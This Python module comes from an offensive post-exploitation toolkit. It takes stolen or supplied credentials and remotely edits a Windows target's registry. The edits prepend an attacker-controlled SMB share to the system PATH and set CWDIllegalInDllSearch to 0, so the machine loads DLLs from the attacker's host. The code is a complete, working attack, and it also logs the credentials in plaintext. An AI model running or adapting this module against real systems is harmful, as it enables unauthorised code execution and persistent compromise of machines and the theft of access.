"""

Appends "\\\\IP\\system\\;" to the front of the PATH env
variable on a target and sets  "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager" 
to 0 so .dll's can be loaded over SMB shares.


Concept from:
    http://carnal0wnage.attackresearch.com/2013/09/finding-executable-hijacking.html


Module built by @harmj0y

"""

from lib import command_methods
from lib import helpers


class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "UNC Dll Hijacking"
        self.description = ("Appends '\\\\IP\\system\\;' to the front of a target's PATH. "
                            "Use ./tools/dll_monitor.py to monitor for .dll hijacking opportunities.")

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "lhost"             : ["", "IP for the UNC path to use"],
                                    "trigger_method" : ["wmis", "[wmis] or [winexe] for triggering"]}

    def run(self):

        # assume single set of credentials (take the first one)
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        lhost = self.required_options["lhost"][0]

        for target in self.targets:

            existingPath, newPath = "", ""

            # reg.exe to get the current path
            pathCMD = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path"
            pathResult = command_methods.executeResult(target, username, password, pathCMD, triggerMethod)

            # parse the PATH output
            parts = pathResult.split("\r\n")
            # check if we get a valid result
            if parts[1].startswith("HKEY"):
                regParts = parts[2].split()
                existingPath = " ".join(regParts[2:])

            if existingPath != "":
                newPath = "\\\\"+lhost+"\\system\\;"+existingPath
            else:
                print helpers.color(" [!] Error: No path found\n", warning=True)

            regCMD = "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path /t REG_EXPAND_SZ /f /d \""+newPath+"\""

            regResult = command_methods.executeResult(target, username, password, regCMD, triggerMethod)

            if regResult == "":
                self.output += "[!] No result file, reg PATH set failed using creds '"+username+":"+password+"' on : " + target + "\n"
            elif "The operation completed successfully." in regResult:
                self.output += "[*] reg PATH successfully set with \\\\"+lhost+"\\system using creds '"+username+":"+password+"' on : " + target + "\n"

                # add in our cleanup command to restore the original PATH
                cleanupCMD = "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path /t REG_EXPAND_SZ /f /d \""+existingPath+"\""
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"
            
                # allow \\UNC loading in %PATH% :)
                regCMD2 = "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" /v CWDIllegalInDllSearch /t REG_DWORD /f /d 0"
                regResult2 = command_methods.executeResult(target, username, password, regCMD2, triggerMethod)
                self.output += "[*] reg command to allow UNC loading successfully set using creds '"+username+":"+password+"' on : " + target + "\n"
                # cleanup -> make everything more secure by disable UNC/SMB loading
                cleanupCMD2 = "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" /v CWDIllegalInDllSearch /t REG_DWORD /f /d 2"
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD2+"|"+triggerMethod+"\n"
            else:
                self.output += "[!] reg PATH set failed using creds '"+username+":"+password+"' on : " + target + "\n"

        # print a message if command succeeded on at least one box
        if self.output != "":
            self.output += "[*] run ./tools/dll_monitor.py to monitor for .dll hijacking"

